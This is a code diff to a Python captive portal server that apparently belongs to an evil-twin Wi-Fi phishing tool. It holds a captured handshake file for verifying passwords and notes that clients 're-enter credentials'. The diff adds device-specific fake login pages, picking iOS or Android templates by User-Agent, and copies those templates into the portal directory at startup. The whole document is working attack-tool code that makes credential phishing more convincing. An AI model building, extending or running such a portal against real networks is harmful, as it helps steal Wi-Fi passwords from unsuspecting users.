@@ -14,6 +14,7 @@ import subprocess
 import time
 from datetime import datetime
 from pathlib import Path
+import shutil
 
 # Configuration from environment or defaults
 PORTAL_DIR = os.environ.get('PORTAL_DIR', '/tmp/portal')
@@ -23,6 +24,7 @@ BIND_ADDR = os.environ.get('BIND_ADDR', '10.0.0.1')
 BIND_PORT = int(os.environ.get('BIND_PORT', '80'))
 HANDSHAKE_FILE = os.environ.get('HANDSHAKE_FILE', '')  # Path to handshake for verification
 VERIFY_MODE = os.environ.get('VERIFY_MODE', 'false').lower() == 'true'
+PORTAL_TEMPLATE = os.environ.get('PORTAL_TEMPLATE', '').lower()  # 'ios' or 'android' or template dir name
 
 # Color codes for terminal output
 RED = '\033[0;31m'
@@ -158,8 +160,15 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
 
         if self.path in captive_paths or self.path == '/':
             # Always serve the portal - even for returning clients
-            # This ensures they can re-enter credentials on reconnection
-            self.path = '/index.html'
+            # Determine which template to use based on User-Agent
+            ua = self.headers.get('User-Agent', '').lower()
+            chosen = '/index.html'
+            # if specialized portal folders exist copy they will reside in portal_dir/ios or /android
+            if 'android' in ua and os.path.exists(os.path.join(PORTAL_DIR, 'android', 'index.html')):
+                chosen = '/android/index.html'
+            elif any(x in ua for x in ('iphone', 'ipad', 'ios')) and os.path.exists(os.path.join(PORTAL_DIR, 'ios', 'index.html')):
+                chosen = '/ios/index.html'
+            self.path = chosen
 
             with client_lock:
                 if client_ip in submitted_clients:
@@ -170,6 +179,7 @@ class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
         # Check if file exists, otherwise serve index.html
         file_path = os.path.join(PORTAL_DIR, self.path.lstrip('/'))
         if not os.path.exists(file_path):
+            # fallback to default
             self.path = '/index.html'
 
         print(f"{CYAN}[{timestamp}]{NC} {WHITE}Page view:{NC} {client_ip} -> {self.path}")
@@ -450,6 +460,51 @@ class ThreadedHTTPServer(http.server.HTTPServer):
             self.shutdown_request(request)
 
 
+def copy_template_to_portal_dir(template_name, portal_dir):
+    """Copy a portal template from repository templates into the runtime portal dir.
+
+    Accepts shorthand 'ios' or 'android' and maps to the template folder names.
+    """
+    # When template_name is empty or 'auto', copy both iOS and Android portals into subfolders
+    repo_templates = os.path.normpath(os.path.join(os.path.dirname(__file__), '..', 'templates', 'portals'))
+
+    def _copy_dir(src, dst):
+        try:
+            for root, dirs, files in os.walk(src):
+                rel = os.path.relpath(root, src)
+                dest_dir = os.path.join(dst, rel) if rel != '.' else dst
+                os.makedirs(dest_dir, exist_ok=True)
+                for f in files:
+                    shutil.copy2(os.path.join(root, f), os.path.join(dest_dir, f))
+            return True
+        except Exception as e:
+            print(f"[!] Error copying template from {src}: {e}")
+            return False
+
+    if not template_name or template_name == 'auto':
+        # attempt both
+        success = False
+        for tpl in ('ios-wifi', 'android-wifi'):
+            src = os.path.join(repo_templates, tpl)
+            if os.path.isdir(src):
+                dst = os.path.join(portal_dir, tpl.replace('-wifi', ''))
+                if _copy_dir(src, dst):
+                    success = True
+        return success
+
+    # otherwise explicit selection
+    mapping = {
+        'ios': 'ios-wifi',
+        'android': 'android-wifi'
+    }
+    tpl_folder = mapping.get(template_name, template_name)
+    src = os.path.join(repo_templates, tpl_folder)
+    if not os.path.isdir(src):
+        print(f"[!] Template not found: {src}")
+        return False
+    return _copy_dir(src, portal_dir)
+
+
 def main():
     print(f"\n{GREEN}{'='*60}{NC}")
     print(f"{GREEN}  Captive Portal Server Started{NC}")
@@ -461,6 +516,19 @@ def main():
     print(f"{GREEN}{'='*60}{NC}")
     print(f"{YELLOW}  Waiting for connections...{NC}\n")
 
+    # Copy portal template(s) into the portal dir before starting
+    if PORTAL_TEMPLATE:
+        copied = copy_template_to_portal_dir(PORTAL_TEMPLATE, PORTAL_DIR)
+        if copied:
+            print(f"{GREEN}  Using portal template:{NC} {PORTAL_TEMPLATE}")
+        else:
+            print(f"{YELLOW}  [!] Failed to apply portal template: {PORTAL_TEMPLATE}{NC}")
+    else:
+        # default to auto detection, copy both ios/android if available
+        copied = copy_template_to_portal_dir('auto', PORTAL_DIR)
+        if copied:
+            print(f"{GREEN}  Using portal template:auto (ios/android detection){NC}")
+
     server = ThreadedHTTPServer((BIND_ADDR, BIND_PORT), CaptivePortalHandler)
 
     try:
@@ -468,7 +536,6 @@ def main():
     except KeyboardInterrupt:
         print(f"\n{YELLOW}[*] Server shutting down...{NC}")
         server.shutdown()
-
 
 if __name__ == '__main__':
     main()
